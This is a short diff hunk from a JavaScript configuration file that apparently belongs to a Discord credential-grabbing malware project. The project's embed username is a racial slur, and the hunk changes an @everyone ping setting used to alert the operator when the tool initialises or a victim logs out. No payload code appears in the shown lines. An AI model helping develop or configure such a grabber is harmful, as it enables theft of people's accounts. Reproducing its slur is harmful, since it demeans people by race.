@@ -20,7 +20,7 @@ var config = {
 
     notify_on_logout: true,
     notify_on_initialization: true,
-    ping: [true, "@Everyone"],
+    ping: [true, "@everyone"],
 
     embed: {
         username: "NiggaGrabber",
